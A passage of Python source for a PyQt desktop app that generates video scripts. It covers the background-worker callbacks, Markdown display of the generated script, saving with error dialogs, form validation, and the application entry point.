        self.progress.setVisible(True)
        self.status.showMessage("Generating... please wait.")
        self.output_view.setMarkdown("_Preparing script..._")

        self._worker = GenerationWorker(request, self)
        self._worker.succeeded.connect(self._on_generation_success)
        self._worker.failed.connect(self._on_generation_error)
        self._worker.finished.connect(self._on_worker_finished)
        self._worker.start()

    def _on_worker_finished(self) -> None:
        self.progress.setVisible(False)
        if self._worker is not None:
            self._worker.deleteLater()
            self._worker = None

    def _on_generation_success(self, request: VideoRequest, script: str) -> None:
        self._last_request = request
        self._last_script = script
        # QTextBrowser supports Markdown natively — shows rich formatting.
        self.output_view.setMarkdown(script)
        self.status.showMessage("Script generated successfully")
        self.generate_btn.setEnabled(True)
        self.save_btn.setEnabled(True)

        reply = QMessageBox.question(
            self,
            "Save Script",
            "Do you want to save this script to a file?",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
            QMessageBox.StandardButton.Yes,
        )
        if reply == QMessageBox.StandardButton.Yes:
            self._on_save()

    def _on_generation_error(self, message: str) -> None:
        self.status.showMessage("Error — see dialog for details")
        self.generate_btn.setEnabled(True)
        QMessageBox.critical(self, "Generation failed", message)
        self.output_view.setMarkdown(f"**[ERROR]** {message}")

    def _on_save(self) -> None:
        if self._last_request is None or not self._last_script:
            QMessageBox.information(
                self, "Nothing to save",
                "Generate a script first, then try saving again.",
            )
            return

        extension = self.format_combo.currentText().strip().lower()
        if extension not in SUPPORTED_FORMATS:
            QMessageBox.warning(
                self, "Invalid format",
                f"Please choose one of: {', '.join(SUPPORTED_FORMATS)}.",
            )
            return

        try:
            saved_path = save_script_to_file(
                self._last_request, self._last_script, extension
            )
        except OSError as exc:
            self.status.showMessage("Save failed — see dialog for details")
            QMessageBox.critical(
                self, "File I/O error",
                f"Could not write the script file:\n{exc}",
            )
            return
        except ValueError as exc:
            self.status.showMessage("Save failed — see dialog for details")
            QMessageBox.critical(self, "Save error", str(exc))
            return
        except Exception as exc:  # noqa: BLE001
            self.status.showMessage("Save failed — see dialog for details")
            QMessageBox.critical(
                self, "Unexpected error", f"Failed to save: {exc}"
            )
            return

        print(f"Script saved to: {saved_path}")
        self.status.showMessage(f"Saved successfully: {saved_path.name}")
        QMessageBox.information(
            self,
            "Saved Successfully",
            f"The script has been saved to:\n{saved_path}",
        )

    def _on_clear(self) -> None:
        self.output_view.clear()
        self.status.showMessage("Ready")
        self._last_request = None
        self._last_script = None
        self.save_btn.setEnabled(False)

    # -- Input validation --------------------------------------------------
    def _read_form(self) -> Optional[VideoRequest]:
        title = self.title_edit.text().strip()
        audience = self.audience_combo.currentText().strip()
        style = self.style_combo.currentText().strip()
        keywords = self.keywords_edit.text().strip()
        duration = int(self.duration_slider.value())

        if not title:
            QMessageBox.warning(
                self, "Missing field", "Please enter a title / topic."
            )
            return None
        if not audience:
            QMessageBox.warning(
                self, "Missing field", "Please enter a target audience."
            )
            return None
        if not style:
            QMessageBox.warning(
                self, "Missing field", "Please choose a narration style."
            )
            return None
        if not (DURATION_MIN <= duration <= DURATION_MAX):
            QMessageBox.warning(
                self, "Invalid duration",
                f"Duration must be between {DURATION_MIN} and "
                f"{DURATION_MAX} minutes.",
            )
            return None

        return VideoRequest(
            title=title,
            duration_minutes=duration,
            audience=audience,
            style=style,
            keywords=keywords,
        )


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------
def main() -> None:
    app = QApplication(sys.argv)
    app.setStyle("Fusion")  # consistent base across platforms
    app.setFont(QFont("Segoe UI", 10))
    app.setStyleSheet(DARK_STYLESHEET)

    window = ScriptGeneratorWindow()
    window.show()
    window.fade_in(duration_ms=600)

    sys.exit(app.exec())


if __name__ == "__main__":
    main()
